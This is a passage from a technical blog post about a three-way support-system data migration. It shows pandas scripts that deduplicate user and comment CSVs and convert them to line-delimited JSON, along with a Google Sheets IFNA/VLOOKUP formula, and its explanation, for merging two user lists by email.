style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Remove any rows with `null`</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">removed_na </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> users_coltype</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">dropna</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">how</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">'any'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Remove duplicate rows, use `email` column as key</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">removed_dups </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> removed_na</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">drop_duplicates</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">subset</span><span class="token operator" style="color:#393A34">=</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"email"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> keep</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">"first"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Display the number of unique users</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">count </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> removed_dups</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">index</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"Found {} unique users"</span><span class="token punctuation" style="color:#393A34">.</span><span class="token builtin">format</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">count</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Generate new CSV with unique users</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">removed_dups</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">to_csv</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">"chat_platform_users.csv"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> index</span><span class="token operator" style="color:#393A34">=</span><span class="token boolean" style="color:#36acaa">False</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>I ran the script which generated <code>chat_platform_users.csv</code> with 13k unique users (where the file <code>chat_data.csv</code> had 2.5M rows).</p>
<p>Step 2 done!</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="step-3-user-list-merging-based-on-common-attribute">Step 3: User List Merging based on Common Attribute<a href="https://kbbgl.github.io/blog/3-way-data-migration-between-support-systems#step-3-user-list-merging-based-on-common-attribute" class="hash-link" aria-label="Direct link to Step 3: User List Merging based on Common Attribute" title="Direct link to Step 3: User List Merging based on Common Attribute">​</a></h2>
<p>So now we had 2 CSV files:</p>
<ul>
<li><code>ticket_platform_users.csv</code> with 56k users.</li>
<li><code>chat_platform_users.csv</code> with 13k users.</li>
</ul>
<p>Since I am pretty proficient with Excel/Google Spreadsheet formulas, I decided to use the <code>VLOOKUP</code> function to generate the required list.
I imported both CSVs into two separate sheets named after their filenames, namely:</p>
<ul>
<li>Sheet 1: <code>ticket_platform_users</code> had 2 columns, <code>email, id</code></li>
<li>Sheet 2: <code>chat_platform_users</code>, had 3 columns, <code>name, email, id</code>.</li>
<li>Sheet 3: <code>merged</code> – This is where we’re going to generate a merged list of users. It had 3 columns as well, <code>name, email, id</code>.</li>
</ul>
<p>The name and email rows were taken from Sheet 2, the <code>id</code> had the following formula in it (in the 2nd row of the sheet):</p>
<div class="language-excel-formula codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-excel-formula codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token operator" style="color:#393A34">=</span><span class="token function-name builtin">IFNA</span><span class="token punctuation" style="color:#393A34">(</span><span class="token function-name builtin">VLOOKUP</span><span class="token punctuation" style="color:#393A34">(</span><span class="token cell selector" style="color:#00009f">A2</span><span class="token operator" style="color:#393A34">,</span><span class="token plain"> </span><span class="token reference string sheet function" style="color:#d73a49">ticket_platform_users</span><span class="token reference string operator" style="color:#393A34">!</span><span class="token range selector cell" style="color:#00009f">$A$2</span><span class="token range selector operator" style="color:#393A34">:</span><span class="token range selector cell" style="color:#00009f">$B$56748</span><span class="token operator" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token operator" style="color:#393A34">,</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">false</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">,</span><span class="token plain"> </span><span class="token reference string sheet function" style="color:#d73a49">chat_platform_users</span><span class="token reference string operator" style="color:#393A34">!</span><span class="token cell selector" style="color:#00009f">C2</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>The explanation of the formula:</p>
<ul>
<li>
<p>The <code>IFNA</code> function takes in 2 arguments:</p>
<ol>
<li>
<p>The first argument is the value which we want to check if it returns a N/A value.</p>
</li>
<li>
<p>The second argument determines what value will be returned in the cell if the value returned in the first argument is NA.</p>
</li>
</ol>
<p>We use this function because we know that some user emails (cells <code>A2...AN</code>) will not be found in both sheets so we want to return the <code>id</code> of the user from the <code>chat_platform_users</code> in this case. Otherwise, if the <code>VLOOKUP</code> function does return a successful match for email in both sheets, the <code>IFNA</code> will evaluate the <code>VLOOKUP</code> value instead.</p>
</li>
<li>
<p>The <code>VLOOKUP</code> function takes 4 arguments:</p>
<ol>
<li>
<p>The first argument is the value to search for. In the example above, cell <code>A2</code> evaluates to a user email so we’ll be searching for that email.</p>
</li>
<li>
<p>The second argument is the range where we’ll be looking for a value matching <code>A2</code>. <code>ticket_platform_users!$A$2:$B$56748</code> in plain words means: ‘within the ticket_platform_users spreadsheet in the static range from cells <code>A2</code> to <code>B56748</code>‘.</p>
</li>
<li>
<p>The third argument identifies the column number to return if a successful match is found. We’ve specified 2 in this case because we’re interested in returning the value from 2nd column from the sheet <code>ticket_platform_users</code> which is the id.</p>
</li>
<li>
<p>The fourth argument is optional and it indicates to the function whether the data is sorted. It is set to false because I imported the data unsorted.</p>
</li>
</ol>
</li>
</ul>
<p>I exported the merged sheet to file <code>merged_users.csv</code>.</p>
<p>Step 3 done!</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="creating-batch-json-objects-from-csv">Creating Batch JSON Objects from CSV<a href="https://kbbgl.github.io/blog/3-way-data-migration-between-support-systems#creating-batch-json-objects-from-csv" class="hash-link" aria-label="Direct link to Creating Batch JSON Objects from CSV" title="Direct link to Creating Batch JSON Objects from CSV">​</a></h2>
<p>At this point, I had put a lot of time and mental energy into manipulating the users data to fit the requirements but had not touched either the tickets or comments data yet. I still needed to somehow generate the JSON representation for all 3 data sets (<code>user</code>, <code>comment</code>, <code>ticket</code>) and somehow insert these data sets into their appropriate final JSON object arrays.</p>
<p>Luckily, <code>pandas</code> was there to lend a hand.</p>
<p>I wrote 3 similar scripts, one for each data set.
For the <code>user</code> CSV:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">generate_user_json.py</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">#!/usr/bin/env python</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token triple-quoted-string string" style="color:#e3116c">"""</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c"># generate_user_json.py</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">"""</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> pandas </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> pd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">users </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> pd</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">read_csv</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token string" style="color:#e3116c">'merged_users.csv'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Modify column data types so `id` is a number</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">users_dt </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> users</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">astype</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token string" style="color:#e3116c">'id'</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'int64'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Convert DataFrame to JSON object</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># One object per line</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">out </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> users_dt</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">to_json</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">orient</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">'records'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> lines</span><span class="token operator" style="color:#393A34">=</span><span class="token boolean" style="color:#36acaa">True</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">with</span><span class="token plain"> </span><span class="token builtin">open</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'all_users_lines.json'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'w'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> encoding</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">'utf-8'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> f</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;f</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">write</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">out</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">""</span><span class="token plain">"</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>For <code>comment</code>:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">generate_comment_json.py</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">#!/usr/bin/env python</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token triple-quoted-string string" style="color:#e3116c">"""</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">generate_comment_json.py</span><br></span><span class="token-line" style="color:#393A34"><span class="token triple-quoted-string string" style="color:#e3116c">"""</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> pandas </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> pd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">comments </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> pd</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">read_csv</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token string" style="color:#e3116c">'chat_data.csv'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;usecols</span><span class="token operator" style="color:#393A34">=</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token string" style="color:#e3116c">'COMMENT_PART_ID'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token string" style="color:#e3116c">'AUTHOR_ID'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token string" style="color:#e3116c">'BODY'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token string" style="color:#e3116c">'COMMENT_PUBLIC'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token string" style="color:#e3116c">'CONVERSATION_ID'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token string" style="color:#e3116c">'COMMENT_CREATED_AT'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Remove duplicates</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">removed_dups </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> comments</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">drop_duplicates</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">subset</span><span class="token operator" style="color:#393A34">=</span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"COMMENT_PART_ID"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> keep</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">"first"</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Remove comments with null fields</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">removed_na </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> removed_dups</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">dropna</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">how</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">'any'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Rename columns according to specifications</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">comments_object </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> removed_na</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">rename</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">columns</span><span class="token operator" style="color:#393A34">=</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token string" style="color:#e3116c">"COMMENT_PART_ID"</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"id"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token string" style="color:#e3116c">"AUTHOR_ID"</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"author_id"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token string" style="color:#e3116c">"BODY"</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"html_body"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token string" style="color:#e3116c">"COMMENT_PUBLIC"</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"public"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token string" style="color:#e3116c">"COMMENT_CREATED_AT"</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"created_at"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token string" style="color:#e3116c">"CONVERSATION_ID"</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"ticket_id"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Modify column data types</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># According to numpy dtypes</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># https://numpy.org/doc/stable/user/basics.types.html</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">comments_final </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> comments_object</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">astype</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token string" style="color:#e3116c">'id'</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'int64'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token string" style="color:#e3116c">'author_id'</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'int64'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token string" style="color:#e3116c">'html_body'</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'str'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token string" style="color:#e3116c">'public'</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'bool'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token string" style="color:#e3116c">'ticket_id'</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'int64'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token string" style="color:#e3116c">'created_at'</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'str'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Convert DataFrame to JSON object</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># One object per line</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">out </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> comments_final</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">to_json</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">orient</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">'records'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> lines</span><span class="token operator" style="color:#393A34">=</span><span class="token boolean" style="color:#36acaa">True</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">outfile</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">'all_comments_lines.json'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">with</span><span class="token plain"> </span><span class="token builtin">open</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">outfile</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">'w'</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> encoding</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">'utf-8'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> f</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span 